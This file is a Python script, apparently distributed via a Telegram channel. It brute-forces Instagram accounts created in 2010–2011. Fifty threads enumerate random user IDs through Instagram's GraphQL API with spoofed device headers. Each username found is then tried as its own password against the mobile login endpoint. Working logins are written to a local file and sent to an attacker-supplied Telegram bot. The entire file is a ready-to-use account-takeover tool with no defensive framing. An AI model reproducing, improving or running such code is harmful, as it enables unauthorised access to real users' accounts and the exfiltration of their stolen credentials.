#  editle  cabuk ##
import requests
import time
import random
import json
import string
import os
import sys
import uuid
from threading import Thread
from colorama import init, Fore, Style
from cfonts import render, say
import re
import hashlib
from datetime import datetime
from threading import Timer
from random import choice, randrange

init(autoreset=True)
red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
yellow = Fore.YELLOW + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
cyan = Fore.CYAN + Style.BRIGHT
white = Fore.WHITE + Style.BRIGHT
reset = Style.RESET_ALL
dim_green = Fore.GREEN
dim_red = Fore.RED
dim_yellow = Fore.YELLOW

uid = str(uuid.uuid4())
INSTA_LOGIN_URL = 'https://b.i.instagram.com/api/v1/accounts/login/'

scanned_total = 0
hits = 0       
bad = 0
retry = 0

tok = None 
chat_id = None 

def stats():
    os.system('cls' if os.name == 'nt' else 'clear')
    output = (
        f"{dim_green}Hits{white}: {hits}  "
        f"{dim_red}Bad Insta{white}: {bad}  "
        f"{dim_yellow}Retries{white}: {retry}  "
    )
    print(output)
    sys.stdout.flush()

def check_login(username, pasw):
    global hits, bad, retry, tok, chat_id

    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    data = {
        'uuid': uid,
        'password': pasw,
        'username': username,
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_countn': '0'
    }

    try:
        response = requests.post(INSTA_LOGIN_URL, headers=headers, data=data, timeout=15)
        result = response.text

        if '"ip"' in result or 'ip_block' in result:
            retry += 1
            stats()
            return

        if '"logged_in_user"' in result or '"challenge_required"' in result:
            hits += 1
            
            output_text_raw = (
                f"""           
⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙      
username: {username}
password: {pasw}
⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙    
ᴛɢ -  @Atlaspy      
            """
            )
            
            color = green if '"logged_in_user"' in result else yellow
            print(f'{color}{output_text_raw}')
            
            with open('2010_2011.txt', 'a', encoding='utf-8') as f:
                f.write(output_text_raw + "\n")
            
            if tok and chat_id:
                try:
                    requests.get(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={chat_id}&text={output_text_raw}", timeout=5)
                except Exception:
                    pass
        else:
            bad += 1

        stats()

    except requests.exceptions.RequestException:
        retry += 1
        stats()
    except Exception:
        retry += 1
        stats()

def check_and_start(username):
    global scanned_total
    scanned_total += 1
    check_login(username, username)

def insta_id_fetcher(bbk_values, id_values):
    while True:
        try:
            chosen_range_index = random.randint(0, len(bbk_values) - 1)
            current_bbk = bbk_values[chosen_range_index]
            current_id = id_values[chosen_range_index]
        except ValueError:
            current_bbk = bbk_values[0]
            current_id = id_values[0]

        try:
            rnd = str(random.randint(10, 9999))
            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
            
            Id = random.randint(current_bbk, current_id)
            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(16))
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }
            
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }

            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data, timeout=10)
            
            if response.status_code == 200:
                json_data = response.json()
                username = json_data.get('data', {}).get('user', {}).get('username')
                
                if username:
                    check_and_start(username)
                else:
                    pass
            else:
                pass

        except requests.exceptions.ConnectionError:
            time.sleep(1)
        except Exception:
            pass

def main():
    global tok, chat_id

    os.system('cls' if os.name == 'nt' else 'clear')
    ATLASpy = render('2010', colors=['magenta', 'white'], align='center')
    print(ATLASpy)

    tok = input(f"Bot Token  :  ")
    chat_id = input(f"Id : ")

    print(f"""
────────────────────────────────────────────────────────
  {white}1.{reset} - 2010
  {white}2.{reset} - 2011
────────────────────────────────────────────────────────
""")
    ATlas = input(f" : {reset}")

    if ATlas == '1':
        bbk_values, id_values = [1001], [1279000]
    elif ATlas == '2':
        bbk_values, id_values = [1279001], [18957417]
    else:
        print(f"{red} Yanlış lan .")
        sys.exit()

    os.system('cls' if os.name == 'nt' else 'clear')

    for _ in range(50):
        Thread(target=insta_id_fetcher, args=(bbk_values, id_values)).start()

    while True:
        stats()
        time.sleep(1)

if __name__ == '__main__':
    main()